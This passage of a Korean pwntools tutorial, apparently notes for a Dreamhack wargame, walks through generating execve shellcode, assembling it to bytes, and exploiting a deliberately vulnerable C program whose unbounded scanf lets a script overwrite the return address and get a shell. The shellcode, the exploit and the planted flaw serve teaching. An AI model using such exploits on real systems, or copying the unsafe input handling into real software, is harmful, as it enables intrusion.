print(code)
```

```bash
$ python3 S3_01_shellcraft.py
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
...
    syscall
```

- pwntools에는 자주 사용되는 셸 코드들이 저장되어 있어서, 공격에 필요한 셸 코드를 쉽게 꺼내 쓸 수 있게 해줌
    - 매우 편리한 기능이지만 정적으로 생성된 셸 코드는 셸 코드가 실행될 때의 메모리 상태를 반영하지 못함
    - 프로그램에 따라 입력할 수 있는 셸 코드의 길이나, 구성 가능한 문자의 종류에 제한이 있을 수 있는데, 이런 조건들도 반영하기 어려움
    - 제약 조건이 존재하는 상황에서는 직접 셸 코드를 작성하는 것이 좋음
- [x86-64를 대상으로 생성할 수 있는 여러 종류의 셸 코드](https://docs.pwntools.com/en/stable/shellcraft/amd64.html)

### asm

```python
#!/usr/bin/env python3
# Name: S3_02_asm.py

from pwn import *
context.arch = 'amd64' # 익스플로잇 대상 아키텍처 'x86-64'

code = shellcraft.sh() # 셸을 실행하는 셸 코드
code = asm(code)       # 셸 코드를 기계어로 어셈블
print(code)
```

```bash
$ python3 S3_02_asm.py
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
```

- pwntools는 어셈블 기능을 제공
    - 대상 아키텍처가 중요하므로, 아키텍처를 미리 지정

## 3. pwntools 실습

### rao 익스플로잇

```c
/*
 * Name: S3_03_rao.c
 * $ gcc -o S3_03_rao S3_03_rao.c -no-pie
 */

#include <stdio.h>
#include <unistd.h>

void get_shell()
{
	char *cmd = "/bin/sh";
	char *args[] = {cmd, NULL};
	execve(cmd, args, NULL);
}

int main(void)
{
	char buf[0x28];
	printf("Input: ");
	scanf("%s", buf);
	return 0;
}
```

```python
#!/usr/bin/python3
#Name: S3_04_rao.py

from pwn import *          # Import pwntools module

p = process('../material/rao')       # Spawn process '../material/rao'

elf = ELF('../material/rao')
get_shell = elf.symbols['get_shell']       # The address of get_shell()

payload = b'A'*0x30        #|       buf      |  <= 'A'*0x30
payload += b'B'*0x8        #|       SFP      |  <= 'B'*0x8
payload += p64(get_shell)  #| Return address |  <= '\xaa\x06\x40\x00\x00\x00\x00\x00'

p.sendline(payload)        # Send payload to './rao'

p.interactive()            # Communicate with shell
```

```bash
$ python3 S3_04_rao.py 
[+] Starting local process '../material/rao': pid 1589556
[*] '/home/.../material/rao'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
Input: $ id
uid=1001 ...
$
```

- 직접 실습하는 경우, 컴파일 시 버퍼의 사이즈가 달라질 수 있으므로 익스플로잇이 이루어지지 않을 수 있음
    - 따라서 정확한 실습을 위해 본 워게임의 첨부 파일로 제공되는 바이너리를 사용하여 실습
        - [original wargame](https://dreamhack.io/wargame/challenges/351/)
        - [material in repo](../material/rao)

## 4. 마치며

### Summary

- process & remote : 로컬 프로세스 또는 원격 서버의 서비스를 대상으로 익스플로잇 수행
- send & recv : 데이터 송수신
- packing & unpacking : 정수를 바이트 배열로, 또는 바이트 배열을 정수로 변환
- interactive : 프로세스 또는 서버와 터미널로 직접 통신
- context.arch : 익스플로잇 대상의 아키텍처
- context.log_level : 익스플로잇 과정에서 출력할 정보의 중요도
- ELF : ELF헤더의 여러 중요 정보 수집
- shellcraft : 다양한 셸 코드를 제공
- asm : 어셈블리 코드를 기계어로 어셈블
